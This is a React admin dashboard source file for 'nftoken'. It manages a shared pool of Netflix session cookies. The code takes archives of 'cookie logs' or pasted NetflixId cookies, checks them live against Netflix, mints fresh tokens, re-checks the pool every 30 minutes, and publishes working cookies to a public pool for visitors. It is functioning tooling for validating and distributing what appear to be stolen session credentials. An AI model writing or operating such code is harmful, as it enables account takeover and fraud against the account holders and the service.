"use client";

import { ChangeEvent, FormEvent, useCallback, useEffect, useState, useMemo } from "react";

/* ------------------------------------------------------------------ */
/*  Types                                                              */
/* ------------------------------------------------------------------ */

type PoolEntry = {
  id: string;
  label: string;
  source?: string;
  country?: string;
  raw: string;
  preview: string;
  status: "working" | "invalid" | "error" | "unchecked";
  message?: string;
  loginUrl?: string;
  expires?: number | null;
  expiryText?: string;
  addedAt: number;
  lastChecked?: number;
};

/* ------------------------------------------------------------------ */
/*  API calls                                                          */
/* ------------------------------------------------------------------ */

function authHeaders(token: string): HeadersInit {
  return { Authorization: `Bearer ${token}` };
}

async function apiLogin(password: string): Promise<{ token?: string; error?: string }> {
  const res = await fetch("/api/admin/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ password }),
  });
  return res.json();
}

async function apiGetPool(token: string): Promise<{ entries: PoolEntry[]; database?: "connected" | "local" }> {
  const res = await fetch("/api/admin/pool", {
    headers: authHeaders(token),
  });
  if (!res.ok) throw new Error("Unauthorized");
  return res.json();
}

async function apiAddCookies(
  token: string,
  cookies: string[],
): Promise<{ added: number; working: number; dead: number; entries: PoolEntry[] }> {
  const res = await fetch("/api/admin/pool", {
    method: "POST",
    headers: { "Content-Type": "application/json", ...authHeaders(token) },
    body: JSON.stringify({ cookies }),
  });
  if (!res.ok) throw new Error((await res.json()).error || "Failed");
  return res.json();
}

async function apiUploadArchive(
  token: string,
  file: File,
): Promise<{ added: number; working: number; dead: number; total: number; skipped: number; entries?: PoolEntry[] }> {
  const fd = new FormData();
  fd.append("file", file);
  const res = await fetch("/api/admin/upload", {
    method: "POST",
    headers: authHeaders(token),
    body: fd,
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || "Upload failed");
  return data;
}

async function apiDeleteEntry(token: string, id: string): Promise<void> {
  const res = await fetch(`/api/admin/pool/${id}`, {
    method: "DELETE",
    headers: authHeaders(token),
  });
  if (!res.ok) throw new Error("Failed to delete");
}

async function apiClearPool(token: string, mode?: "dead"): Promise<void> {
  const url = mode ? `/api/admin/pool?mode=${mode}` : "/api/admin/pool";
  const res = await fetch(url, {
    method: "DELETE",
    headers: authHeaders(token),
  });
  if (!res.ok) throw new Error("Failed to clear");
}

/* ------------------------------------------------------------------ */
/*  Main Component                                                     */
/* ------------------------------------------------------------------ */

export default function AdminPage() {
  const [token, setToken] = useState<string | null>(null);
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState<string | null>(null);
  const [loggingIn, setLoggingIn] = useState(false);

  useEffect(() => {
    const saved = sessionStorage.getItem("admin-token");
    if (saved) setToken(saved);
  }, []);

  async function handleLogin(e: FormEvent) {
    e.preventDefault();
    setLoggingIn(true);
    setLoginError(null);
    try {
      const data = await apiLogin(password);
      if (data.token) {
        setToken(data.token);
        sessionStorage.setItem("admin-token", data.token);
        setPassword("");
      } else {
        setLoginError(data.error || "Invalid password.");
      }
    } catch {
      setLoginError("Network error. Could not connect to server.");
    } finally {
      setLoggingIn(false);
    }
  }

  function handleLogout() {
    setToken(null);
    sessionStorage.removeItem("admin-token");
  }

  // Login Screen
  if (!token) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px", background: "radial-gradient(1000px 500px at 50% 10%, rgba(229, 9, 20, 0.12), var(--bg-body))" }}>
        <div style={{ width: "100%", maxWidth: "420px", background: "var(--bg-card)", border: "1px solid var(--border-color)", borderRadius: "14px", padding: "32px", boxShadow: "0 12px 40px rgba(0, 0, 0, 0.6)" }}>
          <div style={{ textAlign: "center", marginBottom: "26px" }}>
            <div style={{ width: "46px", height: "46px", margin: "0 auto 14px", background: "linear-gradient(135deg, var(--accent) 0%, #85040a 100%)", borderRadius: "10px", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 16px var(--accent-glow)" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
            <h1 style={{ fontSize: "1.45rem", fontWeight: 800, color: "#fff", letterSpacing: "-0.01em", margin: "0 0 6px" }}>
              nftoken <span style={{ color: "var(--accent)" }}>admin</span>
            </h1>
            <p style={{ fontSize: "0.85rem", color: "var(--ink-secondary)", margin: 0 }}>
              Enter password to manage the shared cookie pool
            </p>
          </div>

          <form onSubmit={handleLogin}>
            <div style={{ marginBottom: "16px" }}>
              <label htmlFor="admin-pw" style={{ display: "block", fontSize: "0.78rem", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.1em", color: "var(--ink-muted)", marginBottom: "8px" }}>
                Admin Password
              </label>
              <input
                id="admin-pw"
                type="password"
                className="admin-input"
                style={{ width: "100%", padding: "12px 14px", fontSize: "0.95rem" }}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
                placeholder="••••••••••••"
              />
            </div>

            <button
              type="submit"
              className="btn-primary"
              style={{ width: "100%", padding: "12px", justifyContent: "center", fontSize: "0.95rem" }}
              disabled={loggingIn || !password}
            >
              {loggingIn ? "Verifying…" : "Unlock Admin Dashboard"}
            </button>

            {loginError && <div className="error-banner" style={{ marginTop: "14px", textAlign: "center" }}>{loginError}</div>}
          </form>

          <div style={{ marginTop: "24px", textAlign: "center" }}>
            <a href="/" style={{ color: "var(--ink-muted)", fontSize: "0.82rem", textDecoration: "none", transition: "color 0.15s" }}>
              ← Return to public application
            </a>
          </div>
        </div>
      </div>
    );
  }

  // Dashboard
  return <AdminDashboard token={token} onLogout={handleLogout} />;
}

/* ------------------------------------------------------------------ */
/*  Admin Dashboard                                                    */
/* ------------------------------------------------------------------ */

function AdminDashboard({
  token,
  onLogout,
}: {
  token: string;
  onLogout: () => void;
}) {
  const [entries, setEntries] = useState<PoolEntry[]>([]);
  const [dbStatus, setDbStatus] = useState<"connected" | "local">("local");
  const [bulk, setBulk] = useState("");
  const [busy, setBusy] = useState(false);
  const [message, setMessage] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");

  const refresh = useCallback(async () => {
    try {
      const data = await apiGetPool(token);
      setEntries(data.entries ?? []);
      if (data.database) setDbStatus(data.database);
    } catch {
      onLogout();
    }
  }, [token, onLogout]);

  useEffect(() => {
    refresh().finally(() => setLoading(false));
  }, [refresh]);

  const counts = useMemo(() => ({
    working: entries.filter((e) => e.status === "working").length,
    invalid: entries.filter((e) => e.status === "invalid").length,
    error: entries.filter((e) => e.status === "error").length,
    unchecked: entries.filter((e) => e.status === "unchecked").length,
  }), [entries]);

  async function handleUpload(e: ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    e.target.value = "";
    if (!file) return;
    setBusy(true);
    setMessage(null);
    try {
      const data = await apiUploadArchive(token, file);
      setMessage(
        `✓ Upload complete! ${data.total} parsed · ${data.working} working added · ${data.dead} dead removed${data.skipped ? ` · ${data.skipped} already in pool` : ""}`
      );
      if (data.entries) setEntries(data.entries);
      else await refresh();
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      if (msg.toLowerCase().includes("unauthorized")) {
        onLogout();
        return;
      }
      setMessage("Upload error: " + msg);
    } finally {
      setBusy(false);
    }
  }

  async function handleBulkAdd() {
    const lines = bulk
      .split(/\n/)
      .map((l) => l.trim())
      .filter(Boolean);
    if (lines.length === 0) return;
    setBusy(true);
    setMessage(null);
    try {
      const data = await apiAddCookies(token, lines);
      setMessage(`✓ Added & verified: ${data.working} working added (${data.dead} dead).`);
      setEntries(data.entries);
      setBulk("");
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      if (msg.toLowerCase().includes("unauthorized")) {
        onLogout();
        return;
      }
      setMessage("Error: " + msg);
    } finally {
      setBusy(false);
    }
  }

  async function handleDelete(id: string) {
    try {
      await apiDeleteEntry(token, id);
      setEntries((prev) => prev.filter((e) => e.id !== id));
    } catch {
      /* ignore */
    }
  }

  async function handleClearDead() {
    setBusy(true);
    try {
      await apiClearPool(token, "dead");
      await refresh();
    } finally {
      setBusy(false);
    }
  }

  async function handleRecheckPool() {
    setBusy(true);
    setMessage("⏳ Rechecking all accounts live against Netflix and generating fresh tokens…");
    try {
      const res = await fetch("/api/admin/pool?action=recheck", {
        method: "POST",
        headers: authHeaders(token),
      });
      const data = await res.json();
      if (data.ok && data.result) {
        setMessage(
          `✓ Pool rechecked! ${data.result.working} working · ${data.result.dead} dead · tokens freshly minted. Auto-refresh runs every 30 mins.`
        );
        if (data.entries) setEntries(data.entries);
        else await refresh();
      } else {
        setMessage("Recheck completed.");
        await refresh();
      }
    } catch {
      setMessage("Failed to recheck pool.");
    } finally {
      setBusy(false);
    }
  }

  async function handleClearAll() {
    if (!window.confirm("Remove ALL entries from the shared pool?")) return;
    setBusy(true);
    try {
      await apiClearPool(token);
      setEntries([]);
    } finally {
      setBusy(false);
    }
  }

  const filteredEntries = useMemo(() => {
    const q = search.trim().toLowerCase();
    if (!q) return entries;
    return entries.filter(
      (e) =>
        (e.country && e.country.toLowerCase().includes(q)) ||
        (e.label && e.label.toLowerCase().includes(q)) ||
        (e.preview && e.preview.toLowerCase().includes(q)) ||
        (e.status && e.status.toLowerCase().includes(q))
    );
  }, [entries, search]);

  return (
    <div className="main-content" style={{ minHeight: "100vh" }}>
      {/* Topbar */}
      <header className="topbar">
        <div className="breadcrumb" style={{ display: "flex", alignItems: "center", gap: "12px", flexWrap: "wrap" }}>
          <span>Admin / <span>Pool Management</span></span>
          {dbStatus === "connected" ? (
            <span style={{ padding: "3px 10px", borderRadius: "999px", background: "rgba(34,197,94,0.12)", color: "#22c55e", border: "1px solid rgba(34,197,94,0.3)", fontSize: "0.74rem", fontWeight: 600, display: "inline-flex", alignItems: "center", gap: "6px" }}>
              <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#22c55e" }} />
              Cloud Database Active
            </span>
          ) : (
            <span title="To keep cookies permanently across all phones and serverless cold starts on Vercel/Netlify, connect free Upstash Redis." style={{ padding: "3px 10px", borderRadius: "999px", background: "rgba(234,179,8,0.12)", color: "#eab308", border: "1px solid rgba(234,179,8,0.3)", fontSize: "0.74rem", fontWeight: 600, display: "inline-flex", alignItems: "center", gap: "6px" }}>
              <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#eab308" }} />
              Local Storage Mode
            </span>
          )}
        </div>
        <div className="topbar-actions">
          <a
            href="/"
            className="btn-secondary"
            style={{ padding: "6px 14px", fontSize: "0.82rem", textDecoration: "none" }}
          >
            ↗ View Public Site
          </a>
          <button
            type="button"
            className="btn-secondary"
            style={{ padding: "6px 14px", fontSize: "0.82rem", color: "#ff5e62", borderColor: "rgba(229, 9, 20, 0.4)" }}
            onClick={onLogout}
          >
            Log out
          </button>
        </div>
      </header>

      <div className="page-body">
        <div className="page-category">SYSTEM DASHBOARD</div>
        <h1 className="page-title">
          Cookie Pool <span className="accent-text">Manager</span>
        </h1>
        <p className="page-desc">
          Upload archives, paste cookies in bulk, and manage verified live credentials.
        </p>

        {/* 4 Stat Cards */}
        <div className="stat-grid">
          <div className="stat-card">
            <div className="stat-card-head">Working Cookies</div>
            <div className="stat-card-value" style={{ color: "var(--ok)" }}>
              {counts.working}
            </div>
            <div className="stat-card-foot">published to public pool</div>
          </div>

          <div className="stat-card">
            <div className="stat-card-head">Dead / Invalid</div>
            <div className="stat-card-value" style={{ color: "var(--danger)" }}>
              {counts.invalid}
            </div>
            <div className="stat-card-foot">filtered from visitors</div>
          </div>

          <div className="stat-card">
            <div className="stat-card-head">Pending / Error</div>
            <div className="stat-card-value">{counts.error + counts.unchecked}</div>
            <div className="stat-card-foot">network or token errors</div>
          </div>

          <div className="stat-card">
            <div className="stat-card-head">Total Stored</div>
            <div className="stat-card-value">{entries.length}</div>
            <div className="stat-card-foot">accounts in database</div>
          </div>
        </div>

        {/* Upload & Importer Split Grid */}
        <div className="dashboard-split" style={{ marginBottom: "28px" }}>
          {/* Box 1: Archive Dropzone */}
          <div className="dash-box">
            <div className="dash-box-label">ARCHIVE EXTRACTOR</div>
            <div className="dash-box-title" style={{ marginBottom: "12px" }}>
              Upload .ZIP / .RAR
            </div>
            <p style={{ fontSize: "0.84rem", color: "var(--ink-secondary)", marginBottom: "18px" }}>
              Upload archives containing cookie logs. Cookies will be decompressed, auto-checked, and added to the pool.
            </p>

            <label
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                justifyContent: "center",
                padding: "28px 16px",
                border: "2px dashed var(--border-color)",
                borderRadius: "10px",
                background: "var(--bg-card-sub)",
                cursor: busy ? "not-allowed" : "pointer",
                transition: "all 0.15s",
              }}
            >
              <input
                type="file"
                accept=".zip,.rar,application/zip,application/x-rar-compressed,application/vnd.rar"
                hidden
                disabled={busy}
                onChange={handleUpload}
              />
              <div style={{ width: "40px", height: "40px", borderRadius: "50%", background: "rgba(229, 9, 20, 0.12)", color: "var(--accent)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "10px" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                  <polyline points="17 8 12 3 7 8"></polyline>
                  <line x1="12" y1="3" x2="12" y2="15"></line>
                </svg>
              </div>
              <span style={{ fontSize: "0.92rem", fontWeight: 600, color: "#fff", marginBottom: "4px" }}>
                {busy ? "Processing archive & verifying…" : "Click to select .zip or .rar"}
              </span>
              <span style={{ fontSize: "0.78rem", color: "var(--ink-muted)" }}>
                Max 10 MB per archive
              </span>
            </label>
          </div>

          {/* Box 2: Bulk Paste */}
          <div className="dash-box">
            <div className="dash-box-label">TEXT IMPORTER</div>
            <div className="dash-box-title" style={{ marginBottom: "12px" }}>
              Paste Cookies
            </div>
            <textarea
              className="custom-textarea"
              style={{ minHeight: "105px", marginBottom: "14px" }}
              placeholder={"NetflixId=v=2&ma...\nNetflixId=v=2&ma..."}
              value={bulk}
              onChange={(e) => setBulk(e.target.value)}
            />
            <button
              type="button"
              className="btn-primary"
              style={{ width: "100%", justifyContent: "center" }}
              onClick={handleBulkAdd}
              disabled={busy || !bulk.trim()}
            >
              {busy ? "Verifying & Adding…" : "Verify & Add to Pool"}
            </button>
          </div>
        </div>

        {message && (
          <div style={{ background: "rgba(70, 211, 105, 0.1)", border: "1px solid var(--ok)", borderRadius: "8px", padding: "14px", color: "var(--ok)", fontSize: "0.88rem", marginBottom: "24px" }}>
            {message}
          </div>
        )}

        {/* Pool Table Management */}
        <div className="dash-box">
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 12, marginBottom: "20px" }}>
            <div>
              <div className="dash-box-label">INVENTORY</div>
              <div className="dash-box-title">Manage Pool Entries ({entries.length})</div>
            </div>

            <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
              <input
                type="text"
                placeholder="Search entries…"
                className="pool-search"
                style={{ padding: "6px 12px", minWidth: "180px" }}
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />
              <button
                type="button"
                className="btn-primary"
                style={{ padding: "6px 12px", fontSize: "0.82rem" }}
                onClick={handleRecheckPool}
                disabled={busy || entries.length === 0}
                title="Tests all cookies live against Netflix, generates fresh tokens, and removes dead accounts"
              >
                {busy ? "Checking…" : "🔄 Recheck Pool"}
              </button>
              <button
                type="button"
                className="btn-secondary"
                style={{ padding: "6px 12px", fontSize: "0.82rem" }}
                onClick={() => void refresh()}
                disabled={busy}
              >
                Refresh
              </button>
              <button
                type="button"
                className="btn-secondary"
                style={{ padding: "6px 12px", fontSize: "0.82rem" }}
                onClick={handleClearDead}
                disabled={busy || counts.invalid === 0}
              >
                Clear Dead ({counts.invalid})
              </button>
              <button
                type="button"
                className="btn-secondary"
                style={{ padding: "6px 12px", fontSize: "0.82rem", color: "#ff5e62", borderColor: "rgba(229, 9, 20, 0.4)" }}
                onClick={handleClearAll}
                disabled={busy || entries.length === 0}
              >
                Clear All
              </button>
            </div>
          </div>

          {loading ? (
            <div className="empty-state">Loading pool records…</div>
          ) : filteredEntries.length === 0 ? (
            <div className="empty-state">
              <h3>No entries found</h3>
              <p>Upload an archive or paste cookies above to populate the pool.</p>
            </div>
          ) : (
            <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
              {filteredEntries.map((it) => (
                <div
                  key={it.id}
                  style={{
                    background: "var(--bg-card-sub)",
                    border: "1px solid var(--border-color)",
                    borderRadius: "8px",
                    padding: "12px 16px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    gap: "12px",
                    flexWrap: "wrap",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: "12px", flex: 1, minWidth: "220px" }}>
                    <span
                      style={{
                        width: "8px",
                        height: "8px",
                        borderRadius: "50%",
                        background: it.status === "working" ? "var(--ok)" : it.status === "invalid" ? "var(--danger)" : "var(--warn)",
                        flexShrink: 0,
                      }}
                    />
                    <div>
                      <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "2px" }}>
                        <span style={{ fontSize: "0.9rem", fontWeight: 700, color: "#fff" }}>
                          {it.country || "🌐 Global"}
                        </span>
                        <span style={{ fontSize: "0.74rem", fontFamily: "var(--font-mono)", color: "var(--ink-secondary)" }}>
                          NetflixId {it.preview}
                        </span>
                        <span
                          style={{
                            fontSize: "10px",
                            fontWeight: 700,
                            padding: "2px 6px",
                            borderRadius: "4px",
                            background: it.status === "working" ? "var(--ok-soft)" : "rgba(229, 9, 20, 0.12)",
                            color: it.status === "working" ? "var(--ok)" : "var(--danger)",
                          }}
                        >
                          {it.status}
                        </span>
                      </div>
                      <div style={{ fontSize: "0.76rem", color: "var(--ink-muted)" }}>
                        {it.label ? `${it.label} · ` : ""}
                        {it.expiryText ? `Expires ${it.expiryText}` : it.message || "—"}
                        {it.source ? ` · From ${it.source}` : ""}
                      </div>
                    </div>
                  </div>

                  <button
                    type="button"
                    className="btn-secondary"
                    style={{ padding: "5px 12px", fontSize: "0.78rem", color: "#ff5e62", borderColor: "rgba(229, 9, 20, 0.3)" }}
                    onClick={() => handleDelete(it.id)}
                  >
                    Delete
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
